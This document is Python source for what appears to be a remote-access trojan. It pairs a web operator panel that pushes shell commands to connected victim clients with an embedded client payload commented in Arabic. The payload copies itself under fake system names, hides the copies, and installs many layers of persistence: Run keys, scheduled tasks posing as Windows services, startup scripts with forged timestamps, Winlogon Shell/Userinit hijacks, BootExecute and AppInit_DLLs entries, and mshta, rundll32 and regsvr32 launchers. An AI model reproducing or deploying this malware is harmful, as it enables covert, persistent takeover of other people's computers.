                    addToTerminal(` [${clientId}] ${command}\\n`);
                    
                    try {
                        const response = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId, command: command})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            addToTerminal(`Command sent INSTANTLY\\n`);
                            waitForResult(clientId, command, startTime);
                        } else {
                            addToTerminal(`Error: ${data.error}\\n`);
                        }
                    } catch (err) {
                        addToTerminal(`❌ Network error: ${err}\\n`);
                    }
                }
                
                function executeAll(command) {
                    if (allClients.length === 0) {
                        alert('No clients connected!');
                        return;
                    }
                    
                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
                    if (activeClients.length === 0) {
                        alert('No active clients!');
                        return;
                    }
                    
                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
                    
                    activeClients.forEach(client => {
                        executeSingleCommand(client.id, command);
                    });
                }
                
                function executeSelected(inputId) {
                    const command = document.getElementById(inputId).value.trim();
                    if (!command) {
                        alert('Please enter a command');
                        return;
                    }
                    
                    if (currentClientId) {
                        executeCommand(command);
                    } else {
                        alert('Please select a client first');
                    }
                }
                
                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value.trim();
                    if (cmd) {
                        executeCommand(cmd);
                        document.getElementById('commandInput').value = '';
                    } else {
                        alert('Please enter a command');
                    }
                }
                
                function waitForResult(clientId, command, startTime) {
                    let attempts = 0;
                    const maxAttempts = 100; // More attempts for instant response
                    
                    const checkImmediately = async () => {
                        attempts++;
                        if (attempts > maxAttempts) {
                            const elapsed = (Date.now() - startTime);
                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
                            return;
                        }
                        
                        try {
                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
                            const data = await response.json();
                            
                            if (data.result) {
                                const responseTime = (Date.now() - startTime);
                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
                            } else if (data.pending) {
                                setTimeout(checkImmediately, 10); //  10ms delay for instant checking
                            } else {
                                setTimeout(checkImmediately, 10);
                            }
                        } catch {
                            setTimeout(checkImmediately, 10);
                        }
                    };
                    checkImmediately();
                }
                
                function addToTerminal(text) {
                    const terminal = document.getElementById('terminal');
                    terminal.textContent += text;
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                function openSettings() {
                    window.open('/settings', '_blank');
                }
                
                function logout() {
                    if (confirm('Are you sure you want to logout?')) {
                        window.location = '/';
                    }
                }
                
                // ⚡ Ultra-fast auto-refresh every 1 second
                setInterval(loadSessions, 1000);
                loadSessions();
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_python_client(self):
        """Download ULTRA INSTANT Python client"""
        client_code = '''
import requests
import subprocess
import os
import platform
import time
import uuid
import ctypes
import sys
import winreg
import psutil
import getpass
import threading
import random
import glob
import shutil
import socket
import json
import base64
import hashlib
import pickle
from cryptography.fernet import Fernet
from datetime import datetime

# === نظام التشفير ===
class EncryptionSystem:
    def __init__(self):
        # مفتاح تشفير ثابت ومشفر
        self.key = self.generate_system_key()
        self.cipher = Fernet(self.key)
    
    def generate_system_key(self):
        """إنشاء مفتاح تشفير فريد للنظام"""
        system_id = f"{platform.node()}-{getpass.getuser()}-{uuid.getnode()}"
        return base64.urlsafe_b64encode(hashlib.sha256(system_id.encode()).digest())
    
    def encrypt_data(self, data):
        """تشفير البيانات"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        """فك تشفير البيانات"""
        return self.cipher.decrypt(encrypted_data).decode()

# === نظام النسخ الذاتي المستقل ===
# === نظام النسخ الذاتي المستقل ===
class IndependentReplicationSystem:
    def __init__(self):
        self.original_path = os.path.abspath(__file__)
        self.system_locations = self.get_system_locations()
        self.backup_copies = []
        self.creation_lock = threading.Lock()  # أضفنا Lock لمنع التكرار
        self.initial_creation_done = False     # لتتبع الإنشاء الأولي
        self.all_copies_started = False
        
    def get_system_locations(self):
        """مواقع ذكية للنسخ بدون صلاحيات مدير"""
        locations = []
        
        # 1. مجلدات المستخدم (لا تحتاج صلاحيات)
        user_locations = [
            os.path.join(os.getenv('TEMP'), "system_audio.pyw"),
            os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "system_services.pyw"),
            os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Windows", "system_cache.pyw"),
            os.path.join(os.getenv('USERPROFILE'), "Documents", "system_docs.pyw"),
            os.path.join(os.getenv('USERPROFILE'), "Downloads", "system_downloads.pyw"),
        ]
        
        # 2. مجلدات برامج (يمكن الوصول بدون صلاحيات)
        program_locations = [
            os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows", "system_update.pyw"),
            os.path.join(os.getenv('PROGRAMDATA'), "Adobe", "system_adobe.pyw"),
            os.path.join(os.getenv('PROGRAMDATA'), "Google", "system_chrome.pyw"),
        ]
        
        locations.extend(user_locations)
        locations.extend(program_locations)
        
        return locations
    def create_multiple_copies(self):
        """إنشاء نسخ متعددة مع استبدال الملفات القديمة"""
        created_copies = []
        
        print("🔍 فحص واستبدال الملفات...")
        for location in self.system_locations:
            if os.path.exists(location):
                print(f"   ✅ موجود: {os.path.basename(location)}")
            else:
                print(f"   ❌ مفقود: {os.path.basename(location)}")
        
        for location in self.system_locations:
            try:
                # إنشاء المجلد إذا لم يكن موجوداً
                os.makedirs(os.path.dirname(location), exist_ok=True)
                
                # 🔄 الاستبدال: إذا الملف موجود، احذفه أولاً
                if os.path.exists(location):
                    try:
                        os.remove(location)
                        print(f"🔄 استبدال: {os.path.basename(location)}")
                    except Exception as e:
                        print(f"⚠️ لا يمكن حذف الملف القديم: {e}")
                        continue
                
                # نسخ الملف الجديد (دائماً ننشئ نسخة جديدة)
                shutil.copy2(self.original_path, location)
                
                # إخفاء الملف
                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
                
                created_copies.append(location)
                # تشغيل النسخة مباشرة بعد إنشائها
                self.start_copy(location)
                print(f"✅ إنشاء: {os.path.basename(location)}")
                
            except Exception as e:
                print(f"❌ فشل نسخ {location}: {e}")
        
        self.backup_copies = created_copies
        return created_copies
        
    def install_registry_with_multiple_paths(self):
        try:
            installed_count = 0
            
            registry_entries = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
            ]
            
            for hkey, subkey, value_name in registry_entries:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    # استخدام wscript لتشغيل ملفات .pyw مباشرة
                    vbs_script = f'CreateObject("Wscript.Shell").Run """{random_path}""", 0, False'
                    
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "{vbs_script}"')
                    
                    installed_count += 1
                    print(f"✅ ريجستري: {value_name}")
                    
                except Exception as e:
                    print(f"⚠️ فشل ريجستري: {value_name}")
            
            return installed_count
        except Exception as e:
            return 0
    def start_copy(self, copy_path):
        """تشغيل نسخة من البرنامج - بدون نافذة"""
        try:
            if os.path.exists(copy_path) and copy_path != os.path.abspath(__file__):
                # تشغيل ملف .pyw مباشرة بدون pythonw.exe
                subprocess.Popen([copy_path], 
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            shell=True,
                            creationflags=subprocess.CREATE_NO_WINDOW)
                
                print(f"🚀 تشغيل: {os.path.basename(copy_path)}")
                return True
        except Exception as e:
            print(f"⚠️ فشل تشغيل {copy_path}: {e}")
        return False
    def start_all_copies(self):
        """تشغيل جميع النسخ"""
        print("🚀 تشغيل جميع النسخ...")
        started_count = 0
        for location in self.backup_copies:
            if self.start_copy(location):
                started_count += 1
            time.sleep(1)
        
        self.all_copies_started = True
        print(f"✅ تم تشغيل {started_count} نسخة")
        return started_count
    def install_scheduled_tasks_with_multiple_paths(self):
        """تثبيت مهام مجدولة بمسارات متعددة وبطرق متعددة"""
        try:
            installed_count = 0
            
            scheduled_tasks = [
                "Microsoft\\Windows\\SystemHealth",
                "Microsoft\\Windows\\AudioService", 
                "Microsoft\\Windows\\NetworkService",
                "Microsoft\\Windows\\SecurityUpdate",
                "Microsoft\\Windows\\Maintenance",
                "Microsoft\\Windows\\WindowsUpdate",
                "Microsoft\\Windows\\Defender",
                "Microsoft\\Windows\\UpdateOrchestrator",
            ]
            
            # طرق تشغيل متعددة
            execution_methods = [
                # الطريقة 1: استخدام wscript (الأفضل)
                lambda path: f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0, False"',
                
                # الطريقة 2: استخدام mshta
                lambda path: f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0:close")',
                
                # الطريقة 3: استخدام rundll32 مع ملف .pyw
                lambda path: f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{path}")',
                
                # الطريقة 4: استخدام powershell
                lambda path: f'powershell -WindowStyle Hidden -Command "Start-Process \'{path}\' -WindowStyle Hidden"',
                
                # الطريقة 5: استخدام cmd مع start
                lambda path: f'cmd /c start /min \"\" \"{path}\"',
            ]
            
            for task_name in scheduled_tasks:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    # تجربة كل طريقة حتى تنجح واحدة
                    success = False
                    for method_num, method in enumerate(execution_methods):
                        try:
                            tr_command = method(random_path)
                            
                            # محاولة إنشاء المهمة
                            cmd = f'schtasks /create /tn "{task_name}_{method_num}" /tr "{tr_command}" /sc onlogon /f /rl highest'
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                            
                            if result.returncode == 0:
                                installed_count += 1
                                print(f"✅ مهمة [{method_num+1}]: {task_name} → {os.path.basename(random_path)}")
                                success = True
                                break  # توقف إذا نجحت طريقة
                                
                        except Exception as e:
                            continue
                    
                    if not success:
                        print(f"⚠️  فشل جميع طرق: {task_name}")
                            
                except Exception as e:
                    print(f"⚠️  فشل مهمة: {task_name}")
            
            # محاولات إضافية بترتيب تشغيل مختلف
            additional_triggers = [
                "/sc hourly",           # كل ساعة
                "/sc daily",            # يومياً
                "/sc weekly",           # أسبوعياً
                "/sc onstart",          # عند بدء النظام
                "/sc onidle",           # عند عدم استخدام الجهاز
            ]
            
            for trigger in additional_triggers:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    task_name = f"Microsoft\\Windows\\System_{random.randint(1000,9999)}"
                    tr_command = f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"'
                    
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{tr_command}" {trigger} /f'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
                    
                    if result.returncode == 0:
                        installed_count += 1
                        print(f"✅ مهمة [{trigger}]: {task_name}")
                        
                except Exception:
                    continue
            
            print(f"📊 إجمالي المهام المثبتة: {installed_count}")
            return installed_count
            
        except Exception as e:
            print(f"❌ خطأ عام في المهام: {e}")
            return 0
    
    def install_startup_with_multiple_paths(self):
        """تثبيت بدء التشغيل بمسارات وطرق متعددة متطورة"""
        try:
            installed_count = 0
            
            # جميع مجلدات بدء التشغيل الممكنة (محدثة)
            startup_folders = [
                # مجلدات المستخدم الأساسية
                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.getenv('ALLUSERSPROFILE'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                
                # مجلدات سياسة المجموعة
                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicy', 'Machine', 'Scripts', 'Startup'),
                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicy', 'User', 'Scripts', 'Startup'),
                os.path.join(os.getenv('WINDIR'), 'System32', 'GroupPolicyUsers'),
                
                # مجلدات بديلة ومخفية
                os.path.join(os.getenv('USERPROFILE'), 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.getenv('PUBLIC'), 'Desktop'),
                os.path.join(os.getenv('TEMP'), 'Startup'),
                os.path.join(os.getenv('WINDIR'), 'Tasks'),
                os.path.join(os.getenv('WINDIR'), 'System32', 'Tasks'),
                
                # مجلدات برامج شائعة
                os.path.join(os.getenv('PROGRAMFILES'), 'Common Files', 'Microsoft Shared', 'Startup'),
                os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Common Files', 'Microsoft Shared', 'Startup'),
            ]
            
            # أنواع الملفات المختلفة لبدء التشغيل (محدثة ومطورة)
            file_types = [
                # 1. ملفات VBS (مخفي تماماً) - محسّن
                {
                    'extension': '.vbs',
                    'content': lambda path: f'''On Error Resume Next
    Set ws = CreateObject("Wscript.Shell")
    ws.Run "{path}", 0, False
    Set ws = Nothing
    '''
                },
                
                # 2. ملفات JS - محسّن
                {
                    'extension': '.js',
                    'content': lambda path: f'''try {{
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run('{path}', 0, false);
    }} catch(e) {{}}
    '''
                },
                
                # 3. ملفات WSF - محسّن
                {
                    'extension': '.wsf', 
                    'content': lambda path: f'''<package>
    <job id="Startup">
    <script language="VBScript">
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "{path}", 0, False
        Set WshShell = Nothing
    </script>
    </job>
    </package>'''
                },
                
                # 4. ملفات SCR (شاشات توقف) - محسّن
                {
                    'extension': '.scr',
                    'content': lambda path: f'''@echo off
    setlocal enabledelayedexpansion
    timeout /t 1 /nobreak >nul
    start "" /min "{path}"
    exit
    '''
                },
                
                # 5. ملفات CMD - محسّن
                {
                    'extension': '.cmd',
                    'content': lambda path: f'''@echo off
    if not "%1"=="hidden" (mshta vbscript:createobject("wscript.shell").run("""%~f0"" hidden",0)(window.close)&&exit)
    start "" /min "{path}"
    exit
    '''
                },
                
                # 6. ملفات PIF - محسّن
                {
                    'extension': '.pif',
                    'content': lambda path: f'''@echo off
    powershell -WindowStyle Hidden -Command "& '{path}'"
    exit
    '''
                },
                
                # 7. ملفات SCT - محسّن
                {
                    'extension': '.sct',
                    'content': lambda path: f'''<?XML version="1.0"?>
    <scriptlet>
    <registration description="System Component" progid="System.Component" version="1.0" classid="{{00000000-0000-0000-0000-000000000000}}">
    </registration>
    <public>
        <method name="Start"/>
    </public>
    <script language="JScript">
    <![CDATA[
        function Start() {{
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run('{path}', 0, false);
        }}
        Start();
    ]]>
    </script>
    </scriptlet>'''
                },
                
                # 8. ملفات REG (جديد)
                {
                    'extension': '.reg',
                    'content': lambda path: f'''Windows Registry Editor Version 5.00

    [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
    "SystemService_{random.randint(10000,99999)}"="wscript.exe \\"{path}\\""
    '''
                },
                
                # 9. ملفات LNK (جديد) - تحتاج إنشاء خاص
                {
                    'extension': '.lnk',
                    'content': lambda path: f'[InternetShortcut]\nURL=file:///{path}\n'
                },
                
                # 10. ملفات URL (جديد)
                {
                    'extension': '.url',
                    'content': lambda path: f'[InternetShortcut]\nURL=file:///{path}\nWorkingDirectory=%windir%\\system32\n'
                }
            ]
            
            # أسماء ملفات مقنعة (محدثة)
            convincing_names = [
                "WindowsUpdate", "SystemHealth", "AudioService", "NetworkService",
                "SecurityUpdate", "Maintenance", "Defender", "RuntimeBroker",
                "BackgroundTask", "SystemCache", "UserProfile", "DisplayDriver",
                "PowerManagement", "DeviceManager", "FileSystem", "MemoryOptimizer",
                "WindowsDefender", "SecurityHealth", "UpdateManager", "ServiceHost",
                "TaskScheduler", "EventViewer", "Performance", "SystemMonitor"
            ]
            
            # تقنيات تمويه إضافية
            camouflage_techniques = [
                lambda name: name,  # الاسم الأصلي
                lambda name: f"{name}_{random.randint(1, 9)}",  # اسم مع رقم
                lambda name: f"Microsoft_{name}",  # بادئة Microsoft
                lambda name: f"Windows_{name}",  # بادئة Windows
                lambda name: f"{name}_Service",  # لاحقة Service
                lambda name: f"{name}_Manager",  # لاحقة Manager
                lambda name: f"{name}_Host",  # لاحقة Host
            ]
            
            print("🚀 بدء تثبيت ملفات بدء التشغيل المتقدمة...")
            
            for startup_folder in startup_folders:
                try:
                    os.makedirs(startup_folder, exist_ok=True)
                    
                    # إنشاء 3-5 ملفات في كل مجلد
                    for file_index in range(random.randint(3, 5)):
                        if self.backup_copies:
                            random_path = random.choice(self.backup_copies)
                        else:
                            random_path = self.original_path
                        
                        # اختيار نوع ملف عشوائي وتقنية تمويه
                        file_type = random.choice(file_types)
                        camouflage = random.choice(camouflage_techniques)
                        base_name = random.choice(convincing_names)
                        camouflaged_name = camouflage(base_name)
                        
                        file_name = f"{camouflaged_name}_{random.randint(1000,9999)}{file_type['extension']}"
                        file_path = os.path.join(startup_folder, file_name)
                        
                        try:
                            # كتابة المحتوى
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(file_type['content'](random_path))
                            
                            # تقنيات إخفاء متقدمة
                            subprocess.run(f'attrib +h +s +r "{file_path}"', shell=True, capture_output=True)
                            
                            # تغيير وقت الملف ليبدو قديماً
                            old_time = time.time() - random.randint(86400, 2592000)  # 1-30 يوم
                            os.utime(file_path, (old_time, old_time))
                            
                            # تغيير صلاحيات الملف
                            try:
                                subprocess.run(f'icacls "{file_path}" /grant:r Everyone:RX', shell=True, capture_output=True)
                            except:
                                pass
                            
                            installed_count += 1
                            print(f"✅ بدء تشغيل [{file_index+1}]: {file_name}")
                            
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    continue  # استمرار مع المجلد التالي
            
            # نظام ريجستري متقدم لبدء التشغيل
            print("🔧 تثبيت إدخالات الريجستري المتقدمة...")
            try:
                registry_locations = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                ]
                
                for hkey, subkey in registry_locations:
                    try:
                        # إنشاء 2-3 إدخالات في كل موقع ريجستري
                        for reg_index in range(random.randint(2, 3)):
                            if self.backup_copies:
                                random_path = random.choice(self.backup_copies)
                            else:
                                random_path = self.original_path
                            
                            camouflage = random.choice(camouflage_techniques)
                            base_name = random.choice(convincing_names)
                            value_name = camouflage(base_name)
                            
                            # طرق تنفيذ مختلفة للريجستري
                            execution_methods = [
                                f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"',
                                f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0:close")',
                                f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{random_path}")',
                                f'cmd /c start /min "" "{random_path}"',
                            ]
                            
                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, random.choice(execution_methods))
                            
                            installed_count += 1
                            print(f"✅ ريجستري [{reg_index+1}]: {value_name}")
                            
                    except Exception:
                        continue
                        
            except Exception as e:
                print(f"⚠️ فشل في بعض إدخالات الريجستري: {e}")
            
            # إنشاء مهام بدء تشغيل إضافية
            print("⏰ إنشاء مهام بدء تشغيل إضافية...")
            try:
                for i in range(3):
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    task_name = f"Startup_{random.choice(convincing_names)}_{random.randint(1000,9999)}"
                    cmd = f'schtasks /create /tn "{task_name}" /tr "wscript.exe /e:vbscript \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"\"\"{random_path}\\\"\"\\\", 0, False\"" /sc onlogon /f'
                    
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=8)
                    if result.returncode == 0:
                        installed_count += 1
                        print(f"✅ مهمة بدء: {task_name}")
                        
            except Exception as e:
                print(f"⚠️ فشل في بعض المهام: {e}")
            
            print(f"🎯 اكتمل التثبيت! إجمالي طرق بدء التشغيل: {installed_count}")
            return installed_count
            
        except Exception as e:
            print(f"❌ خطأ عام في بدء التشغيل: {e}")
            return 0   
         
    def install_shell_entries_with_multiple_paths(self):
        """تثبيت إدخالات Shell متقدمة بمسارات وطرق متعددة"""
        try:
            installed_count = 0
            
            # إدخالات Shell متقدمة ومتنوعة
            shell_entries = [
                # إدخالات Winlogon الأساسية
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
                
                # إدخالات Shell متقدمة
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "System"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UIHost"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UIHost"),
                
                # إدخالات سياسات Shell
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "Shell"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "Shell"),
                
                # إدخالات بديلة لـ Shell
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
                
                # إدخالات خدمات Windows
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "BootExecute"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "SetupExecute"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", "StartupRegExp"),
                
                # إدخالات AppInit DLLs
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "LoadAppInit_DLLs"),
                
                # إدخالات Notifications
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects"),
            ]
            
            # طرق تنفيذ متعددة لملفات .pyw
            execution_methods = [
                # الطريقة 1: استخدام wscript (الأفضل)
                lambda path: f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0, False"',
                
                # الطريقة 2: استخدام mshta
                lambda path: f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"\"\"{path}\"\"\", 0:close")',
                
                # الطريقة 3: استخدام rundll32
                lambda path: f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";window.open("{path}")',
                
                # الطريقة 4: استخدام powershell
                lambda path: f'powershell -WindowStyle Hidden -Command "& \'{path}\'"',
                
                # الطريقة 5: استخدام cmd مع start
                lambda path: f'cmd /c start /min "" "{path}"',
                
                # الطريقة 6: استخدام regsvr32 (للملفات .sct)
                lambda path: f'regsvr32 /s /n /i:"{path}" scrobj.dll',
            ]
            
            # أسماء مقنعة للقيم
            convincing_names = [
                "WindowsShell", "UserInit", "SystemShell", "UIHost", "ShellService",
                "BootManager", "SessionManager", "AppInit", "ServiceLoader", "Explorer",
                "WindowsCore", "SystemUI", "UserManager", "SecurityHost", "RuntimeBroker"
            ]
            
            print("🔧 بدء تثبيت إدخالات Shell المتقدمة...")
            
            for hkey, subkey, value_name in shell_entries:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    # اختيار طريقة تنفيذ عشوائية
                    execution_method = random.choice(execution_methods)
                    command_to_execute = execution_method(random_path)
                    
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        try:
                            # محاولة قراءة القيمة الحالية
                            current_value, value_type = winreg.QueryValueEx(key, value_name)
                            
                            # معالجة أنواع القيم المختلفة
                            if value_type == winreg.REG_SZ:
                                # بالنسبة لـ REG_SZ، نضيف إلى القيمة الحالية
                                if value_name in ["Shell", "Userinit"]:
                                    # للقيم الحساسة مثل Shell وUserinit، نضيف بشكل آمن
                                    if random_path not in current_value:
                                        new_value = f'{current_value},{command_to_execute}'
                                    else:
                                        new_value = current_value
                                else:
                                    new_value = command_to_execute
                                    
                            elif value_type == winreg.REG_MULTI_SZ:
                                # بالنسبة لـ REG_MULTI_SZ، نضيف عنصر جديد
                                if isinstance(current_value, list):
                                    new_value = current_value + [command_to_execute]
                                else:
                                    new_value = [current_value, command_to_execute]
                                    
                            else:
                                # لأنواع أخرى، نستبدل القيمة
                                new_value = command_to_execute
                                
                        except FileNotFoundError:
                            # إذا القيمة غير موجودة، ننشئها
                            if value_name in ["AppInit_DLLs", "BootExecute"]:
                                new_value = command_to_execute
                            else:
                                new_value = command_to_execute
                        
                        # كتابة القيمة الجديدة
                        if isinstance(new_value, list):
                            winreg.SetValueEx(key, value_name, 0, winreg.REG_MULTI_SZ, new_value)
                        else:
                            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, str(new_value))
                    
                    installed_count += 1
                    print(f"✅ Shell: {value_name} → {os.path.basename(random_path)}")
                    
                except Exception as e:
                    print(f"⚠️ فشل Shell {value_name}: {e}")
            
            # إنشاء إدخالات Shell جديدة بإسماء عشوائية
            print("🔄 إنشاء إدخالات Shell جديدة...")
            try:
                additional_entries = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                ]
                
                for hkey, subkey in additional_entries:
                    try:
                        # إنشاء 2-3 إدخالات في كل موقع
                        for i in range(random.randint(2, 3)):
                            if self.backup_copies:
                                random_path = random.choice(self.backup_copies)
                            else:
                                random_path = self.original_path
                            
                            value_name = f"{random.choice(convincing_names)}_{random.randint(1000,9999)}"
                            execution_method = random.choice(execution_methods)
                            command_to_execute = execution_method(random_path)
                            
                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command_to_execute)
                            
                            installed_count += 1
                            print(f"✅ Shell إضافي: {value_name}")
                            
                    except Exception:
                        continue
                        
            except Exception as e:
                print(f"⚠️ فشل في الإدخالات الإضافية: {e}")
            
            # تثبيت إدخالات AppInit_DLLs متقدمة
            print("📚 تثبيت إدخالات AppInit_DLLs...")
            try:
                dll_entries = [
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "LoadAppInit_DLLs"),
                ]
                
                for hkey, subkey, value_name in dll_entries:
                    try:
                        if value_name == "LoadAppInit_DLLs":
                            # تفعيل LoadAppInit_DLLs
                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)
                        else:
                            # إضافة إلى AppInit_DLLs
                            if self.backup_copies:
                                random_path = random.choice(self.backup_copies)
                            else:
                                random_path = self.original_path
                            
                            # إنشاء ملف DLL وهمي (للمظهر فقط)
                            fake_dll = f"c:\\windows\\system32\\api_{random.randint(1000,9999)}.dll"
                            
                            with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                                try:
                                    current_value, _ = winreg.QueryValueEx(key, value_name)
                                    new_value = f'{current_value},{fake_dll}'
                                except FileNotFoundError:
                                    new_value = fake_dll
                                
                                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
                        
                        installed_count += 1
                        print(f"✅ AppInit: {value_name}")
                        
                    except Exception as e:
                        print(f"⚠️ فشل AppInit {value_name}: {e}")
                        
            except Exception as e:
                print(f"⚠️ فشل في إدخالات AppInit: {e}")
            
